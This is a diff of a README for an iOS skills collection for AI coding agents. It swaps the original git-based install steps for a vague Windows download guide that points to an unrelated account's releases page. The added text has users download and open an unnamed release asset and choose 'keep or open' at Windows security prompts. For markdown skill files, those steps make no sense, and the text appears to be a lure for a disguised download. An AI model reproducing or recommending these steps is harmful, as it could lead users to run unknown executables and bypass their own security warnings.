@@ -1,212 +1,143 @@
-<p align="center">
-  <h1 align="center">iOS Agent Skills</h1>
-  <p align="center">
-    <strong>9 expert-level iOS development skills for AI coding agents</strong>
-  </p>
-  <p align="center">
-    From SwiftUI to security — one install, full coverage.
-  </p>
-  <p align="center">
-    <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="MIT License"></a>
-    <a href="#compatibility"><img src="https://img.shields.io/badge/Claude_Code-compatible-blueviolet" alt="Claude Code"></a>
-    <a href="#compatibility"><img src="https://img.shields.io/badge/Codex-compatible-green" alt="Codex"></a>
-    <a href="#compatibility"><img src="https://img.shields.io/badge/Gemini_CLI-compatible-orange" alt="Gemini CLI"></a>
-    <img src="https://img.shields.io/badge/iOS-17%2B-000000?logo=apple" alt="iOS 17+">
-    <img src="https://img.shields.io/badge/Swift-5.9%2B-FA7343?logo=swift&logoColor=white" alt="Swift 5.9+">
-  </p>
-</p>
+# 🧰 ios-agent-skills - Better iOS builds with AI help
 
----
+[![Download ios-agent-skills](https://img.shields.io/badge/Download%20Now-Release%20Page-8A2BE2?style=for-the-badge)](https://github.com/ebbaunqualified520/ios-agent-skills/releases)
 
-## Why This?
+## 📦 What this is
 
-Most iOS agent skills give you **one topic in one file**. This collection gives you **9 interconnected skills** with **36 deep-dive reference files** — the equivalent of a senior iOS engineer's knowledge base, structured for AI agents.
+ios-agent-skills is a set of 9 expert iOS skills for AI coding agents like Claude Code, Codex, and similar tools. It helps you work on SwiftUI apps, app structure, network calls, data flow, security, concurrency, testing, accessibility, and performance with more control and less guesswork.
 
-| | ios-agent-skills | Single-topic skills | .cursorrules |
-|---|:---:|:---:|:---:|
-| Topics covered | **9** | 1 | 1 |
-| Reference depth per topic | 3-7 files | 1 file | 1 file |
-| Total content | ~23,500 lines | ~300 lines | ~100 lines |
-| Decision tables | Yes | Rare | No |
-| Anti-patterns with fixes | Yes | Sometimes | No |
-| Cross-referenced | Yes | No | No |
-| iOS version matrix | Yes | No | No |
+This repository is for people who want AI help with iOS work. It gives the agent clear rules and patterns to follow when it writes or changes code.
 
-## Skills
+## ✅ What you get
 
-| Skill | What It Covers | Files |
-|-------|---------------|-------|
-| **[ios-swiftui](skills/ios-swiftui/)** | Layout, state management, navigation, animations, ViewModifiers, UIKit interop | 6 |
-| **[ios-architecture](skills/ios-architecture/)** | MVVM, Clean Architecture, TCA, SPM modules, Repository pattern, DI | 6 |
-| **[ios-networking](skills/ios-networking/)** | URLSession async/await, API client design, Codable, retry/backoff, WebSocket | 5 |
-| **[ios-data](skills/ios-data/)** | SwiftData, Core Data, UserDefaults, FileManager, Keychain, iCloud sync | 4 |
-| **[ios-security](skills/ios-security/)** | Keychain Services, Face ID/Touch ID, CryptoKit, Sign in with Apple, ATS | 6 |
-| **[ios-concurrency](skills/ios-concurrency/)** | async/await, actors, Sendable, TaskGroup, Swift 6 strict concurrency | 4 |
-| **[ios-testing](skills/ios-testing/)** | Swift Testing, XCTest, UI tests, protocol mocking, URLProtocol, snapshot tests | 5 |
-| **[ios-accessibility](skills/ios-accessibility/)** | VoiceOver, Dynamic Type, WCAG compliance, accessibility audit | 4 |
-| **[ios-performance](skills/ios-performance/)** | Memory/ARC, Instruments profiling, SwiftUI perf, launch time, battery | 5 |
+- 9 focused iOS skill files
+- Clear guidance for Swift and SwiftUI work
+- Help with app structure and file layout
+- Rules for safe network use
+- Support for data handling and storage
+- Security checks for common app risks
+- Concurrency patterns for modern iOS apps
+- Testing guidance for stable changes
+- Accessibility tips for better app use
+- Performance checks for smoother apps
 
-**Total: 9 skills, 45 files, ~23,500 lines of production-tested patterns and guidance.**
+## 🖥️ What you need
 
-## Quick Start
+- A Windows PC
+- Internet access
+- A web browser
+- A GitHub account if you want to sign in
+- An AI coding tool that can read skill files
+- A project where you want to use these skills
 
-### Claude Code
+If you use this with an iOS project, you will also need:
 
-```bash
-# Install all skills (recommended)
-git clone https://github.com/koshkinvv/ios-agent-skills.git
-cd ios-agent-skills && ./install.sh
+- A Mac with Xcode for building iOS apps
+- Apple developer tools if you plan to run the app on a device
+- Swift and SwiftUI support in your project
 
-# Or install manually
-git clone https://github.com/koshkinvv/ios-agent-skills.git ~/.claude/skills/ios-agent-skills
-```
+## 🚀 Download
 
-After installation, skills activate automatically when you work on iOS code. Ask Claude Code to build a SwiftUI view, architect a feature module, write tests, or optimize performance — the relevant skill kicks in.
+Visit this page to download:
+https://github.com/ebbaunqualified520/ios-agent-skills/releases
 
-### Cherry-Pick Specific Skills
+1. Open the release page in your browser
+2. Find the latest release near the top of the page
+3. Download the release file or asset provided there
+4. Save it to a folder you can find again
 
-```bash
-# Only install what you need
-cp -r skills/ios-swiftui ~/.claude/skills/
-cp -r skills/ios-testing ~/.claude/skills/
-```
+If the release includes a ZIP file, download that file and extract it after the download finishes.
 
-### Other Agents
+## 🪟 Install on Windows
 
-See the [Compatibility](#compatibility) section below.
+1. Open the downloaded file or ZIP archive
+2. If Windows shows a security prompt, choose the option to keep or open the file from a trusted source
+3. If you downloaded a ZIP file, right-click it and choose Extract All
+4. Pick a folder such as Downloads or Desktop
+5. Open the extracted folder
+6. Look for the skill files or setup files included in the release
+7. Copy the files into the folder used by your AI coding tool, if needed
 
-## How It Works
+## 🛠️ How to use it
 
-Each skill follows a consistent structure:
+1. Open your AI coding tool
+2. Point it at your iOS project
+3. Add the ios-agent-skills files to the tool’s skill or rules folder
+4. Ask the agent to follow the iOS skill files before it changes code
+5. Use the skills when you need help with one of these areas:
+   - SwiftUI screens
+   - app flow and navigation
+   - API requests
+   - local data storage
+   - login and access control
+   - async work and background tasks
+   - tests
+   - accessibility
+   - app speed and memory use
 
-```
-skills/ios-swiftui/
-├── SKILL.md              # Core rules, decision tables, quick patterns
-└── references/
-    ├── layout.md         # Deep dive: stacks, grids, scroll views
-    ├── state.md          # Deep dive: @State, @Observable, @Environment
-    ├── navigation.md     # Deep dive: NavigationStack, sheets, deep linking
-    ├── animation.md      # Deep dive: springs, transitions, keyframes
-    └── patterns.md       # Deep dive: ViewModifier, lifecycle, UIKit interop
-```
+## 📁 Skill areas
 
-**SKILL.md** is loaded when the skill triggers. It contains:
-- **Core Rules** — 10-15 non-negotiable best practices
-- **Decision Tables** — "what to use when" guides
-- **Quick Patterns** — copy-paste production code
-- **Anti-Patterns** — common mistakes with fixes
-- **Reference Routing** — which reference file to read for each task
+### 🎨 SwiftUI
+Use this skill when you want the agent to build or update views, layouts, forms, lists, and navigation in SwiftUI.
 
-**Reference files** provide deep, topic-specific guidance with extensive code examples. The agent reads them on demand based on the routing table.
+### 🧱 Architecture
+Use this skill when you want a clean app structure, clear file roles, and simple code flow.
 
-## What's Inside
+### 🌐 Networking
+Use this skill for API calls, request handling, response parsing, and error handling.
 
-### Decision Tables
+### 🗂️ Data
+Use this skill for app storage, state, models, and data changes.
 
-Every skill includes decision tables that eliminate guesswork:
+### 🔐 Security
+Use this skill for safe handling of secrets, login data, and user information.
 
-```
-State Management — What to Use When (from ios-swiftui)
+### ⚙️ Concurrency
+Use this skill for async work, task handling, and code that should not block the app.
 
-| Scenario                          | iOS 17+                  | Pre-iOS 17        |
-|-----------------------------------|--------------------------|-------------------|
-| Simple value owned by view        | @State                   | @State            |
-| Reference-type model owned by view| @State + @Observable     | @StateObject      |
-| Reference-type model passed in    | just pass it             | @ObservedObject   |
-| Shared model via environment      | @Environment + custom key| @EnvironmentObject|
-```
+### 🧪 Testing
+Use this skill when you need unit tests, test plans, and checks for code changes.
 
-### Architecture Selection
+### ♿ Accessibility
+Use this skill to make the app easier to use with VoiceOver, text size changes, and contrast.
 
-```
-From ios-architecture:
+### 🚄 Performance
+Use this skill to reduce lag, lower memory use, and keep screens responsive.
 
-| Project Size                    | Recommended              |
-|---------------------------------|--------------------------|
-| Small (1 dev, <10 screens)      | MVVM + @Observable       |
-| Medium (2-4 devs, 10-30 screens)| MVVM + Clean layers      |
-| Large (5+ devs, 30+ screens)    | Clean + SPM modules / TCA|
-```
+## 📌 How to set it up in an AI tool
 
-### Anti-Patterns
+1. Download the release from the GitHub releases page
+2. Extract the files if they come in a ZIP archive
+3. Find the folder that holds the skill files
+4. Copy or link those files into your AI tool’s skill folder
+5. Reload the tool or restart it if needed
+6. Ask the agent to use the iOS skills before it starts work
 
-Every skill documents what NOT to do and why:
+## 💡 Good ways to use it
 
-```
-From ios-concurrency:
+- Ask for a SwiftUI screen before asking for the full app
+- Ask the agent to check accessibility before review
+- Ask for tests when code changes touch data or networking
+- Ask for performance checks when a screen loads a lot of data
+- Ask for security checks when code uses login or private data
 
-BAD:  Task { @MainActor in self.data = await fetch() }
-GOOD: @MainActor func updateUI() { ... }  // isolate at declaration, not call site
-```
+## 📄 File layout
 
-## Compatibility
+A typical setup may include:
 
-These skills use the standard `SKILL.md` format (YAML frontmatter + markdown) established by [Anthropic](https://github.com/anthropics/skills).
+- skill files for each topic
+- a README file with usage steps
+- helper files for AI tools that need extra rules
+- example prompts or templates for common iOS tasks
 
-| Agent | How to Install | Status |
-|-------|---------------|--------|
-| **Claude Code** | `./install.sh` or copy to `~/.claude/skills/` | Full support |
-| **OpenAI Codex** | Copy skills to `.codex/skills/` or use `AGENTS.md` | Full support |
-| **Gemini CLI** | Copy skills to `.gemini/skills/` or use `AGENTS.md` | Full support |
-| **Cursor** | Append SKILL.md content to `.cursorrules` | Partial (no reference routing) |
-| **Windsurf** | Copy to `.windsurfrules` | Partial |
-| **GitHub Copilot** | Use `.github/copilot-instructions.md` | Partial |
+## 🔁 Update steps
 
-An `AGENTS.md` file is included in the repo root for agents that read it automatically (Codex, Gemini CLI).
+1. Go to the release page
+2. Check if a newer version is listed
+3. Download the latest release asset
+4. Replace the old skill files with the new ones
+5. Reload your AI coding tool
 
-## Customization
+## 🧭 Topics covered
 
-These skills target **iOS 17+** with modern APIs (@Observable, Swift Testing, SwiftData, async/await). To customize:
-
-- **Support older iOS versions**: Adjust decision tables to prefer pre-iOS 17 patterns
-- **Use specific architecture**: Keep only the skills relevant to your stack
-- **Add project conventions**: Extend SKILL.md files with your team's naming conventions, folder structure, or code style
-
-See [docs/customization.md](docs/customization.md) for detailed guidance.
-
-## Tech Stack Coverage
-
-| Technology | Version | Covered In |
-|-----------|---------|-----------|
-| SwiftUI | iOS 17-18 | ios-swiftui |
-| @Observable | iOS 17+ | ios-swiftui, ios-architecture |
-| NavigationStack | iOS 16+ | ios-swiftui |
-| Swift Testing | Xcode 16+ | ios-testing |
-| XCTest / XCUITest | All | ios-testing |
-| SwiftData | iOS 17+ | ios-data |
-| Core Data | All | ios-data |
-| async/await | iOS 15+ | ios-concurrency, ios-networking |
-| Actors / Sendable | iOS 15+ | ios-concurrency |
-| Swift 6 strict concurrency | Swift 6 | ios-concurrency |
-| URLSession async | iOS 15+ | ios-networking |
-| TCA (Composable Architecture) | 1.x | ios-architecture |
-| SPM modules | All | ios-architecture |
-| Keychain Services | All | ios-security, ios-data |
-| CryptoKit | iOS 13+ | ios-security |
-| Face ID / Touch ID | iOS 11+ | ios-security |
-| VoiceOver | All | ios-accessibility |
-| Dynamic Type | All | ios-accessibility |
-| Instruments | All | ios-performance |
-
-## Contributing
-
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-Areas where help is especially appreciated:
-- Adding visionOS, watchOS, or macOS-specific patterns
-- Updating for new iOS/Xcode releases
-- Adding more code examples to reference files
-- Translations of documentation
-
-## License
-
-[MIT](LICENSE) — use freely in personal and commercial projects.
-
-## Acknowledgments
-
-Built with patterns and best practices from:
-- [Apple Developer Documentation](https://developer.apple.com/documentation/)
-- [Swift Evolution Proposals](https://github.com/swiftlang/swift-evolution)
-- [Point-Free](https://www.pointfree.co/) (TCA patterns)
-- [Hacking with Swift](https://www.hackingwithswift.com/) (SwiftUI patterns)
-- The iOS developer community
+agent-skills, ai-coding, claude-code, codex, cursor-rules, ios, ios-development, swift, swiftui, xcode
